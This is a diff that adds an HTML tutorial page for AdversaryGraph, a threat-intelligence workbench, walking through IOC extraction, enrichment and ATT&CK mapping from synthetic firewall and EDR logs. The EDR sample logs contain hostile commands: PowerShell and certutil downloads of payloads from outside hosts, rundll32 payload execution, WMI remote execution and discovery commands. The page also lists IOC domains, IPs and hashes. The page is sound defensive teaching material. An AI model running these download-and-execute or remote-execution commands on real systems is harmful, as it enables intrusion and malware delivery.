@@ -1,0 +1,272 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-TMTG21RVHM"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-TMTG21RVHM');
+    </script>
+    <meta charset="utf-8" />
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>From Log to Report: IOC Investigation With AdversaryGraph | 1200km</title>
+    <meta name="description" content="A practical AdversaryGraph v3 workflow: turn synthetic firewall and EDR telemetry into IOC extraction, enrichment, relationship graph review, ATT&CK leads, and an AI-assisted investigation report." />
+    <meta name="author" content="Andrey Pautov" />
+    <meta name="keywords" content="AdversaryGraph, IOC investigation, AI log analysis, EDR log analysis, firewall logs, CTI workflow, MITRE ATT&CK, IOC enrichment, OpenCTI, VirusTotal, OTX, urlscan, Mustang Panda, RedDelta, detection engineering" />
+    <meta property="og:title" content="From Log to Report: IOC Investigation With AdversaryGraph" />
+    <meta property="og:description" content="Use AdversaryGraph to move from firewall and EDR logs to IOC enrichment, relationship graph review, ATT&CK leads, and an analyst-ready report." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://1200km.com/articles/adversarygraph-from-log-to-report-ioc-investigation.html" />
+    <meta property="og:image" content="https://1200km.com/assets/adversarygraph-ai-og.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://1200km.com/assets/adversarygraph-ai-og.png" />
+    <link rel="canonical" href="https://1200km.com/articles/adversarygraph-from-log-to-report-ioc-investigation.html" />
+    <link rel="icon" href="../assets/favicon.png" type="image/png" />
+    <link rel="stylesheet" href="../assets/site-theme.css" />
+    <style>
+      body {
+        margin: 0;
+        font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        color: #dce8fb;
+        background: #050c1a;
+        line-height: 1.7;
+      }
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        background: linear-gradient(180deg, rgba(5,12,26,0.94), rgba(5,12,26,0.88)), url("../assets/bg-cyber.png") center/cover no-repeat;
+        z-index: -1;
+      }
+      a { color: #93c5fd; text-decoration: none; }
+      a:hover { color: #dbeafe; text-decoration: underline; }
+      .site-header {
+        position: sticky;
+        top: 0;
+        z-index: 10;
+        border-bottom: 1px solid rgba(147,197,253,0.22);
+        background: rgba(5,12,26,0.92);
+        backdrop-filter: blur(14px);
+      }
+      .nav, .hero-inner, main, .footer-inner { width: min(1080px, calc(100% - 32px)); margin: 0 auto; }
+      .nav { min-height: 64px; display: flex; align-items: center; justify-content: space-between; gap: 18px; }
+      .brand { display: inline-flex; align-items: center; gap: 10px; color: #f8fbff; font-weight: 800; }
+      .brand img { width: 36px; height: 36px; border-radius: 10px; }
+      .nav-links { display: flex; flex-wrap: wrap; gap: 14px; font-size: 0.92rem; }
+      .hero { border-bottom: 1px solid rgba(147,197,253,0.22); background: rgba(5,12,26,0.82); }
+      .hero-inner { padding: 58px 0 36px; }
+      .eyebrow { margin: 0 0 12px; color: #7dd3fc; font-size: 0.76rem; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; }
+      h1 { margin: 0; max-width: 920px; color: #f8fbff; font-size: clamp(2.1rem, 5vw, 3.8rem); line-height: 1.06; }
+      .lead { max-width: 860px; margin: 18px 0 0; color: #c9d7ea; font-size: 1.08rem; }
+      .meta { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 18px; }
+      .chip { display: inline-flex; align-items: center; border: 1px solid rgba(147,197,253,0.28); border-radius: 999px; padding: 5px 10px; color: #bfdbfe; background: rgba(13,31,60,0.78); font-size: 0.8rem; font-weight: 700; }
+      .hero-img { display: block; width: 100%; margin-top: 28px; border: 1px solid rgba(147,197,253,0.28); border-radius: 12px; background: #050c1a; }
+      main { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 34px; padding: 42px 0 72px; }
+      article { min-width: 0; background: rgba(8,19,38,0.88); border: 1px solid rgba(147,197,253,0.24); border-radius: 14px; padding: clamp(22px, 4vw, 42px); }
+      aside { align-self: start; position: sticky; top: 84px; }
+      .side-card { background: rgba(8,19,38,0.88); border: 1px solid rgba(147,197,253,0.24); border-radius: 14px; padding: 18px; }
+      h2 { margin: 40px 0 12px; color: #f8fbff; font-size: 1.45rem; }
+      h2:first-child { margin-top: 0; }
+      h3 { margin: 24px 0 8px; color: #f8fbff; }
+      p { margin: 0 0 16px; }
+      ul, ol { margin: 0 0 18px 22px; padding: 0; }
+      li { margin: 6px 0; }
+      pre { overflow-x: auto; border: 1px solid rgba(147,197,253,0.24); border-radius: 10px; padding: 14px; background: #030712; color: #cbd5e1; font-size: 0.86rem; }
+      code { color: #e5e7eb; }
+      table { width: 100%; border-collapse: collapse; margin: 18px 0; border: 1px solid rgba(147,197,253,0.22); }
+      th, td { padding: 10px; border-bottom: 1px solid rgba(147,197,253,0.16); text-align: left; vertical-align: top; }
+      th { color: #f8fbff; background: rgba(15,98,254,0.16); }
+      td { color: #c9d7ea; }
+      .callout { border: 1px solid rgba(96,165,250,0.38); border-radius: 12px; padding: 18px; background: rgba(15,98,254,0.12); margin: 24px 0; }
+      .button-row { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
+      .button { display: inline-flex; min-height: 42px; align-items: center; justify-content: center; padding: 0 16px; border: 1px solid rgba(147,197,253,0.28); border-radius: 7px; background: rgba(8,19,38,0.72); color: #dce8fb; font-weight: 700; }
+      .button.primary { background: #f43f5e; border-color: #f43f5e; color: #fff; }
+      footer { border-top: 1px solid rgba(147,197,253,0.22); background: rgba(5,12,26,0.96); padding: 24px 0; color: #8fa8cc; }
+      @media (max-width: 900px) { main { grid-template-columns: 1fr; } aside { position: static; } .nav { align-items: flex-start; flex-direction: column; padding: 14px 0; } }
+    </style>
+  </head>
+  <body>
+    <header class="site-header">
+      <nav class="nav" aria-label="Main navigation">
+        <a class="brand" href="../index.html">
+          <img src="../assets/adversarygraph-ai-icon-192.png" alt="AdversaryGraph logo" />
+          <span>AdversaryGraph</span>
+        </a>
+        <div class="nav-links">
+          <a href="../adversarygraph/">Project Hub</a>
+          <a href="../adversarygraph-docs/">Docs</a>
+          <a href="../adversarygraph/use-cases.html">Use Cases</a>
+          <a href="../cti.html">CTI</a>
+          <a href="https://github.com/anpa1200/adversarygraph">GitHub</a>
+          <a href="https://medium.com/@1200km">Medium</a>
+        </div>
+      </nav>
+    </header>
+
+    <section class="hero">
+      <div class="hero-inner">
+        <p class="eyebrow">AdversaryGraph v3.0 workflow</p>
+        <h1>From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation</h1>
+        <p class="lead">
+          A practical workflow for moving from raw telemetry to IOC extraction, enrichment, relationship graph review, ATT&amp;CK technique leads, and an analyst-ready report.
+        </p>
+        <div class="meta">
+          <span class="chip">IOC Investigation</span>
+          <span class="chip">AI log analysis</span>
+          <span class="chip">MITRE ATT&amp;CK</span>
+          <span class="chip">OpenCTI / OTX / VT</span>
+          <span class="chip">Detection handoff</span>
+        </div>
+        <img class="hero-img" src="../assets/adversarygraph-ai-og.png" alt="AdversaryGraph AI banner" />
+      </div>
+    </section>
+
+    <main>
+      <article>
+        <div class="callout">
+          The scenario below uses synthetic firewall and EDR telemetry seeded with real IOC examples from a Mustang Panda / RedDelta-style CTI dataset. The logs are lab data, not victim telemetry. Actor names are treated as investigation leads, not attribution conclusions.
+        </div>
+
+        <h2 id="about">About AdversaryGraph</h2>
+        <p>
+          AdversaryGraph is a self-hosted AI-assisted CTI-to-detection workbench. It connects raw evidence, threat intelligence, ATT&amp;CK mapping, IOC enrichment, actor context, relationship graph pivots, and report generation into one local workflow.
+        </p>
+        <p>
+          The core path is simple: raw evidence -> IOC extraction -> enrichment -> relationship graph -> ATT&amp;CK mapping -> report.
+        </p>
+
+        <h2 id="goal">The Investigation Goal</h2>
+        <p>
+          The analyst starts with two noisy inputs: firewall logs showing repeated outbound traffic and EDR logs showing suspicious PowerShell, discovery commands, unsigned payload staging, and remote execution leads.
+        </p>
+        <ol>
+          <li>Extract useful observables from raw logs.</li>
+          <li>Identify suspicious behavior and likely ATT&amp;CK techniques.</li>
+          <li>Send extracted IOCs into IOC Investigation.</li>
+          <li>Enrich the IOCs through local DB, OpenCTI, OTX, VirusTotal, urlscan, ThreatFox, and other configured sources.</li>
+          <li>Review relationships, evidence ranking, source conflicts, actor leads, and TTP leads.</li>
+          <li>Generate a structured report with the AI assistant.</li>
+        </ol>
+
+        <h2 id="firewall">Synthetic Firewall Logs</h2>
+        <p>
+          The firewall sample simulates repeated outbound connections from one workstation to suspicious IPs and domains.
+        </p>
+        <pre><code>2026-06-20T08:14:11Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 sni=power-sync-services.com
+2026-06-20T08:17:44Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=443 sni=gatewayrvcenter.com
+2026-06-20T08:24:31Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 url=http://metakit.fireant.vn/Software/version.xml
+2026-06-20T08:24:35Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 url=http://metakit.fireant.vn/Software/setup.exe
+2026-06-20T08:31:42Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=443 sni=m.flach.cn note=opencti-indicator-alias-reddelta</code></pre>
+        <p>
+          The pattern matters more than one line: repeated outbound communication, HTTP retrieval of `version.xml` and `setup.exe`, and CTI-linked infrastructure.
+        </p>
+
+        <h2 id="edr">Synthetic EDR Logs</h2>
+        <pre><code>2026-06-20T08:24:38Z EDR process_start parent=WINWORD.EXE process=powershell.exe cmd="Invoke-WebRequest -Uri http://metakit.fireant.vn/Software/setup.exe -OutFile C:\ProgramData\Microsoft\setup.exe"
+2026-06-20T08:24:51Z EDR file_create path=C:\ProgramData\Microsoft\setup.exe sha256=eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f signer=unsigned
+2026-06-20T08:25:31Z EDR process_start parent=setup.exe process=cmd.exe cmd="cmd.exe /c whoami /all && hostname && ipconfig /all"
+2026-06-20T08:26:12Z EDR process_start parent=setup.exe process=nltest.exe cmd="nltest.exe /dclist:corp.local"
+2026-06-20T08:27:20Z EDR process_start parent=setup.exe process=rundll32.exe cmd="rundll32.exe C:\ProgramData\Microsoft\msupdate.dat,StartW"
+2026-06-20T08:32:03Z EDR process_start parent=rundll32.exe process=wmic.exe cmd="wmic.exe /node:FIN-FS-01 process call create \"cmd.exe /c whoami\""
+2026-06-20T08:36:12Z EDR process_start parent=rundll32.exe process=certutil.exe cmd="certutil.exe -urlcache -split -f http://gatewayrvcenter.com/payload.dat C:\ProgramData\Microsoft\cache.bin"</code></pre>
+
+        <h2 id="ai-analysis">Step 1: Paste Logs Into AI Log Analysis</h2>
+        <p>
+          In <strong>AI Analysis</strong>, paste the firewall and EDR logs and ask AdversaryGraph to extract IOCs, suspicious commands, suspicious processes, possible ATT&amp;CK techniques, kill-chain context, and actor or malware leads. The prompt should explicitly say not to claim attribution and to show evidence for every finding.
+        </p>
+
+        <h2 id="extraction">Step 2: Extract IOCs And Suspicious Activity</h2>
+        <table>
+          <thead><tr><th>Type</th><th>Examples</th></tr></thead>
+          <tbody>
+            <tr><td>IPs</td><td>103.119.47.104, 38.60.245.37, 166.88.77.186</td></tr>
+            <tr><td>Domains</td><td>power-sync-services.com, gatewayrvcenter.com, metakit.fireant.vn, m.flach.cn</td></tr>
+            <tr><td>URLs</td><td>http://metakit.fireant.vn/Software/setup.exe, http://power-sync-services.com/update/check</td></tr>
+            <tr><td>Hashes</td><td>eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f, fd2c2f1bf90592604febf404e5579f89</td></tr>
+          </tbody>
+        </table>
+        <table>
+          <thead><tr><th>Technique lead</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>T1059 / T1059.001</td><td>PowerShell and command execution.</td></tr>
+            <tr><td>T1105</td><td>Download of `setup.exe` and `payload.dat`.</td></tr>
+            <tr><td>T1071.001</td><td>HTTP/HTTPS C2-like traffic.</td></tr>
+            <tr><td>T1218.011</td><td>`rundll32.exe` executing a suspicious payload.</td></tr>
+            <tr><td>T1047</td><td>WMI remote execution lead.</td></tr>
+            <tr><td>T1036</td><td>Masqueraded file names and Microsoft-looking staging path.</td></tr>
+          </tbody>
+        </table>
+
+        <h2 id="ioc-investigation">Step 3: Investigate Extracted IOCs</h2>
+        <p>
+          Open <strong>IOC Investigation</strong>, submit the strongest IOC, and run Tier 1 / Tier 2 / Tier 3 enrichment. AdversaryGraph queries enabled sources, including local DB, OpenCTI, OTX, VirusTotal, urlscan, ThreatFox, Malpedia, GreyNoise Community, AbuseIPDB, Shodan, and Censys when configured.
+        </p>
+
+        <h2 id="graph">Step 4: Review The Relationship Graph</h2>
+        <p>
+          The relationship graph is the analyst pivot map. Nodes can represent the root IOC, related domains, IPs, actor leads, malware labels, tags, source references, and TTP leads. Each node can be opened or reinvestigated, and focused graph mode hides noisy context until needed.
+        </p>
+
+        <h2 id="report">Step 5: Generate The Report</h2>
+        <p>
+          After evidence review, send the investigation context to the report workflow. A strong output includes the IOC type, suspiciousness rationale, source evidence, TTP leads, actor-lead caveats, kill-chain interpretation, recommended pivots, and defensive actions.
+        </p>
+
+        <h2 id="why">Why This Workflow Matters</h2>
+        <p>
+          Most platforms can list alerts. The value here is the workflow: extract evidence, enrich it, preserve the uncertainty, connect it to ATT&amp;CK, and create a report that another analyst can audit.
+        </p>
+        <p>
+          AdversaryGraph is not an attribution engine. It is a workbench for producing better CTI and detection handoff faster while keeping source context visible.
+        </p>
+
+        <div class="button-row">
+          <a class="button primary" href="../adversarygraph-docs/capabilities/">Read Capabilities</a>
+          <a class="button" href="../adversarygraph/use-cases.html">Use Cases</a>
+          <a class="button" href="../adversarygraph/">Project Hub</a>
+          <a class="button" href="https://github.com/anpa1200/adversarygraph">GitHub</a>
+        </div>
+      </article>
+
+      <aside>
+        <div class="side-card">
+          <h2>Contents</h2>
+          <ol>
+            <li><a href="#about">About</a></li>
+            <li><a href="#goal">Goal</a></li>
+            <li><a href="#firewall">Firewall logs</a></li>
+            <li><a href="#edr">EDR logs</a></li>
+            <li><a href="#ai-analysis">AI analysis</a></li>
+            <li><a href="#extraction">Extraction</a></li>
+            <li><a href="#ioc-investigation">IOC investigation</a></li>
+            <li><a href="#graph">Graph</a></li>
+            <li><a href="#report">Report</a></li>
+          </ol>
+          <h2>Ecosystem</h2>
+          <ul>
+            <li><a href="../adversarygraph/">AdversaryGraph hub</a></li>
+            <li><a href="../adversarygraph-docs/">Documentation</a></li>
+            <li><a href="../adversarygraph-docs/full-flow/">Get started</a></li>
+            <li><a href="../cti.html">CTI research</a></li>
+            <li><a href="../external-validation.html">External validation</a></li>
+          </ul>
+        </div>
+      </aside>
+    </main>
+
+    <footer>
+      <div class="footer-inner">
+        <strong>Follow My Work</strong><br />
+        Portfolio / Knowledge Base: <a href="https://1200km.com/">https://1200km.com/</a><br />
+        Medium: <a href="https://medium.com/@1200km">https://medium.com/@1200km</a><br />
+        GitHub: <a href="https://github.com/anpa1200">https://github.com/anpa1200</a><br />
+        LinkedIn: <a href="https://www.linkedin.com/in/andrey-pautov/">https://www.linkedin.com/in/andrey-pautov/</a><br />
+        Andrey Pautov
+      </div>
+    </footer>
+  </body>
+</html>
